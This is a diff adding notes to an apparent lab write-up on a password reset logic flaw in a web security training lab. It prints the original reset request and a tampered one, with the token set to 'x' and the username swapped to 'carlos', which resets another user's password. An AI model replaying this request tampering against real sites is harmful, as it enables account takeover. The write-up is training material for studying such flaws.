@@ -81,3 +81,61 @@ This lab's password reset functionality is vulnerable. To solve the lab, reset C
 5. In the browser, request a new password reset and change your password again. Send the `POST /forgot-password?temp-forgot-password-token` request to Burp Repeater again.
 6. In Burp Repeater, delete the value of the `temp-forgot-password-token` parameter in both the URL and request body. Change the `username` parameter to `carlos`. Set the new password to whatever you want and send the request.
 7. In the browser, log in to Carlos's account using the new password you just set. Click **My account** to solve the lab.
+Note:
+```
+This was the actual request:
+
+POST /forgot-password?temp-forgot-password-token=j6upkce94j1j0xo9yvtcj920maxxj1t8 HTTP/2
+Host: 0a3d00490439880f8048035900340023.web-security-academy.net
+Cookie: session=lTHxOhZ3Bx8s6HXJnTqhPByn4OpVhvFz
+Content-Length: 117
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Origin: https://0a3d00490439880f8048035900340023.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a3d00490439880f8048035900340023.web-security-academy.net/forgot-password?temp-forgot-password-token=j6upkce94j1j0xo9yvtcj920maxxj1t8
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=0, i
+
+temp-forgot-password-token=j6upkce94j1j0xo9yvtcj920maxxj1t8&username=wiener&new-password-1=peter&new-password-2=peter
+```
+
+
+**This was the manipulated request :** as told to do in step 6
+```
+POST /forgot-password?temp-forgot-password-token=x HTTP/2
+Host: 0a3d00490439880f8048035900340023.web-security-academy.net
+Cookie: session=lTHxOhZ3Bx8s6HXJnTqhPByn4OpVhvFz
+Content-Length: 86
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Origin: https://0a3d00490439880f8048035900340023.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a3d00490439880f8048035900340023.web-security-academy.net/forgot-password?temp-forgot-password-token=j6upkce94j1j0xo9yvtcj920maxxj1t8
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=0, i
+
+temp-forgot-password-token=x&username=carlos&new-password-1=peter&new-password-2=peter
+```
+
+
